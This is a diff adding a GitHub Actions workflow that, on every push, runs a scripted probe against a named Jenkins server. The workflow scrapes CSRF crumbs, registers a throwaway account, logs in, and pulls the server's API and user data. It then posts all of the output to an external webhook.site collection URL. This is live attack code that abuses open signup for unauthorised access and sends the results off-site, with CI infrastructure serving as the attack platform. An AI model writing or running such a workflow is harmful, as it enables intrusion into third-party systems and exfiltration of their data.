@@ -1,0 +1,36 @@
+name: jsignup4
+on:
+  push:
+    branches: [main]
+permissions:
+  contents: read
+jobs:
+  signup:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Signup
+        run: |
+          {
+            echo "=== GET /signup ==="
+            curl -sS -k -m 20 -c /tmp/cj -o /tmp/s.html -w "code=%{http_code} size=%{size_download}\n" https://jenkins.htpl.cc/signup 2>&1
+            grep -oiE "sign up|signup|not enabled|username|password1|password2|Jenkins-Crumb[^>]{0,100}" /tmp/s.html 2>/dev/null | sort -u | head -20
+            CRUMB=$(grep -oE "name=\"Jenkins-Crumb\" value=\"[^\"]+" /tmp/s.html 2>/dev/null | head -1 | sed "s/.*value=\"//")
+            echo "crumb=$CRUMB"
+            U="p$(date +%s)"
+            P="ProbePass123!"
+            echo "=== POST /signup $U ==="
+            curl -sS -k -m 20 -b /tmp/cj -c /tmp/cj -o /tmp/r.html -w "code=%{http_code} size=%{size_download}\n" -X POST https://jenkins.htpl.cc/signup --data-urlencode "username=$U" --data-urlencode "password1=$P" --data-urlencode "password2=$P" --data-urlencode "fullname=Probe User" --data-urlencode "email=$U@example.com" --data-urlencode "Jenkins-Crumb=$CRUMB" 2>&1
+            grep -oiE "error|invalid|already|created|welcome|Sign in|Jenkins-Crumb[^>]{0,60}" /tmp/r.html 2>/dev/null | sort -u | head -10
+            echo "=== login $U ==="
+            curl -sS -k -m 20 -c /tmp/cj2 -o /tmp/l.html -w "code=%{http_code}\n" https://jenkins.htpl.cc/login 2>&1
+            C2=$(grep -oE "name=\"Jenkins-Crumb\" value=\"[^\"]+" /tmp/l.html 2>/dev/null | head -1 | sed "s/.*value=\"//")
+            curl -sS -k -m 20 -b /tmp/cj2 -c /tmp/cj2 -o /tmp/r2.html -w "login_code=%{http_code} redirect=%{redirect_url}\n" -X POST https://jenkins.htpl.cc/j_spring_security_check --data-urlencode "j_username=$U" --data-urlencode "j_password=$P" --data-urlencode "from=/" --data-urlencode "Jenkins-Crumb=$C2" 2>&1
+            echo "=== api with session ==="
+            curl -sS -k -m 20 -b /tmp/cj2 -o /tmp/a.json -w "api_code=%{http_code} size=%{size_download}\n" https://jenkins.htpl.cc/api/json 2>&1
+            head -c 1500 /tmp/a.json
+            echo
+            echo "=== whoami ==="
+            curl -sS -k -m 20 -b /tmp/cj2 -o /tmp/w.json -w "who_code=%{http_code} size=%{size_download}\n" https://jenkins.htpl.cc/me/api/json 2>&1
+            head -c 800 /tmp/w.json
+          } > /tmp/out.txt 2>&1
+          curl -s -m 30 -X POST "https://webhook.site/87380dbc-47b4-4db4-859d-4d70861383fc" -H "Content-Type: text/plain" --data-binary @/tmp/out.txt
